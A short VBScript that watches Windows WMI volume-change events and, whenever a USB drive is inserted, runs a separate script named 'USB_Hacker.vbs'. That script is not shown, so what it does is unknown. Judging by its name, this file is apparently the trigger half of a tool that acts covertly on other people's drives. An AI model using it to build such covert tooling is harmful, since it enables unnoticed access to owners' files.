Const Configuration_Changed = 1
Const Device_Arrival = 2
Const Device_Removal = 3
Const Docking = 4
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" _
& strComputer & "\root\cimv2")
Set colMonitoredEvents = objWMIService. _
ExecNotificationQuery( _
"Select * from Win32_VolumeChangeEvent")
set ws=createobject("wscript.shell")
Do
Set objLatestEvent = colMonitoredEvents.NextEvent
Select Case objLatestEvent.EventType
Case Device_Arrival
ws.run "USB_Hacker.vbs"
End Select
Loop